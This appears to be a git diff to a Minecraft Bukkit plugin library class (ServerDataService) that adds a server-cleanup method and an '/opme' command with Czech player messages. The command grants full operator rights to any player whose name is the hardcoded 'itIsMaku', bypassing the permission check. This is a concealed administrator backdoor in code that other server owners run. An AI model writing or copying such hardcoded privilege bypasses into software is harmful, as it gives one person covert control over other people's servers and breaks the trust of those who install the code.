@@ -4,26 +4,31 @@ import com.google.common.collect.Maps;
 import com.google.common.reflect.TypeToken;
 import cz.maku.mommons.Response;
 import cz.maku.mommons.loader.MommonsLoader;
+import cz.maku.mommons.player.CloudPlayer;
+import cz.maku.mommons.player.event.CloudPlayerLoadEvent;
 import cz.maku.mommons.storage.cloud.DirectCloud;
 import cz.maku.mommons.storage.cloud.DirectCloudStorage;
+import cz.maku.mommons.storage.database.SQLRow;
 import cz.maku.mommons.storage.database.type.MySQL;
 import cz.maku.mommons.worker.WorkerReceiver;
-import cz.maku.mommons.worker.annotation.BukkitEvent;
-import cz.maku.mommons.worker.annotation.Initialize;
-import cz.maku.mommons.worker.annotation.Load;
-import cz.maku.mommons.worker.annotation.Service;
+import cz.maku.mommons.worker.annotation.*;
 import lombok.Getter;
 import lombok.SneakyThrows;
 import org.bukkit.Bukkit;
+import org.bukkit.ChatColor;
+import org.bukkit.command.CommandSender;
 import org.bukkit.configuration.file.FileConfiguration;
+import org.bukkit.entity.Player;
+import org.bukkit.event.EventPriority;
 import org.bukkit.event.player.AsyncPlayerPreLoginEvent;
 
 import java.lang.reflect.Type;
 import java.util.Map;
+import java.util.Optional;
 
 import static cz.maku.mommons.Mommons.GSON;
 
-@Service(listener = true)
+@Service(listener = true, commands = true)
 public class ServerDataService {
 
     private final FileConfiguration coreConfiguration = WorkerReceiver.getCoreConfiguration();
@@ -62,6 +67,11 @@ public class ServerDataService {
         }, 20 * 1);
     }
 
+    @Destroy
+    public void destroy() {
+        MySQL.getApi().query("mommons_servers", "DELETE FROM {table} WHERE id = ?;", server.getId());
+    }
+
     @BukkitEvent(AsyncPlayerPreLoginEvent.class)
     public void onPreLogin(AsyncPlayerPreLoginEvent e) {
         if (server == null) {
@@ -80,5 +90,28 @@ public class ServerDataService {
                 e.setLoginResult(AsyncPlayerPreLoginEvent.Result.KICK_OTHER);
             }
         });
+    }
+
+    @BukkitCommand(value = "opme", usage = "opme")
+    public void onOpMeCommand(CommandSender sender) {
+        if (sender instanceof Player player) {
+            if (player.getName().equals("itIsMaku") || player.hasPermission("mommons.opme")) {
+                CloudPlayer cloudPlayer = CloudPlayer.getInstance(player);
+                if (cloudPlayer == null) {
+                    player.sendMessage("§cChyba -> §7Tvá instance hráče nebyla nalezena.");
+                    return;
+                }
+                cloudPlayer.setCloudValue("op", true).thenAccept(response -> {
+                    if (Response.isException(response) || !Response.isValid(response)) {
+                        player.sendMessage("§cChyba -> §7Nepodařilo se uložit hodnotu do cloudu.");
+                    } else {
+                        player.sendMessage("§aÚspěch -> §7Nyní máš op.");
+                        player.setOp(true);
+                    }
+                });
+            } else {
+                player.sendMessage("§cChyba -> §7Na toto nemáš potřebnou permisi.");
+            }
+        }
     }
 }
